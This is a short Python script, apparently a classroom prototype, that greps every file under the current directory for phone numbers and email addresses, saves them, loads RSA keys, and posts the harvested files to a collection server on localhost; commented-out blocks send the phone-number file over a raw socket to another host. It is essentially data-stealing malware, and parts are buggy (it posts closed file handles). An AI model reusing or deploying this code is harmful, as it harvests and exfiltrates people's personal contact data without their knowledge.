import os
from twilio.rest import TwilioRestClient
import socket
import smtplib
from email.mime.text import MIMEText
import Crypto
from Crypto.PublicKey import RSA
from Crypto import Random
from base64 import b64decode
import sys
import requests

grep_numbers = "grep -roh '\(([0-9]\{3\})\|[0-9]\{3\}\)[ -]\?[0-9]\{3\}[ -]\?[0-9]\{4\}' . | sort -u > phonenumbers.txt"
grep_emails = "grep -Eroh '\\b[a-zA-Z0-9.-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9.-]+\\b' . | sort -u > emails.txt"

os.system(grep_numbers)
os.system(grep_emails)

key64 = b'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuPWBgF4lw44cjPMO74LQfM4F0FnJDU4B   \
           lW8lEXriqep85cN8LLuzHu5hVnVXTY2Dasc2dOUhsb6x4C4O9nW+cOG2sqBE/S5y74B+iOnr3ZtnpG \
           015wTZW66HL3Z4+imPI9IhL2y1Mgpc7FK5ti6R3//njsHHS46ks5PhWo8tvIGViiaEHTr9lO5bOhaTl \
           JgdbxU+NpBgnjk+XikQLCvXJ+5TNe6LvMxp6UUnU9vQM50L0g/JPQhAfIXm/HE0w1YQ1c4DFEJoFBjGo \
           Uq0krQEacSeTgaWauBTtedGCvtwsRFkNXk90RyQx4q/Q4Khk6uGtSPP9YxsUM7hCm2QDOPp1wIDAQAB'

keyDER = b64decode(key64)
pubkey = RSA.importKey(keyDER)
privkeyfp = open('private.pem','r')
privkey = RSA.importKey(privkeyfp.read(),passphrase='cs460')

fp_numbers = open('phonenumbers.txt', 'r')
fp_emails = open('emails.txt','r')
numbers_plain = "PHONE_NUMBER_HEADER\n" + fp_numbers.read()
emails_plain = "EMAILS_HEADER\n" + fp_emails.read()
#numbers_cipher = pubkey.encrypt(numbers_plain, 0)
#emails_cipher = pubkey.encrypt(emails_plain, 0)
#print privkey.decrypt(numbers_cipher))
#print privkey.decrypt(emails_cipher)

fp_numbers.seek(0)
fp_emails.seek(0)

fp_numbers.close()
fp_emails.close()

r = requests.post("http://localhost:5000", data={'numbers': fp_numbers, 'emails': fp_emails})
print(r.text) # displays the result body.

# s = socket.socket()         # Create a socket object
# host = '10.0.2.15'  
# port = 12345                 # Reserve a port for your service.
# s.connect((host, port))
# print "asdf"
# f = open('phonenumbers.txt','rb')
# print 'Sending...'
# l = f.read(1024)
# while (l):
#     print 'Sending...'
#     s.send(l)
#     l = f.read(1024)
# f.close()
# print "Done Sending"
# s.shutdown(socket,SHUT_WR)
# print s.recv(1024)
# s.close                     # Close the socket when done

# TCP_IP = '10.0.2.15'
# TCP_PORT = 12345
# BUFFER_SIZE = 1024
# MESSAGE = "Hello, World!" 
# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# print "ASDF"
# s.connect((TCP_IP, TCP_PORT))
# s.send(MESSAGE)
# data = s.recv(BUFFER_SIZE)
# s.close()
# print "received data:", data
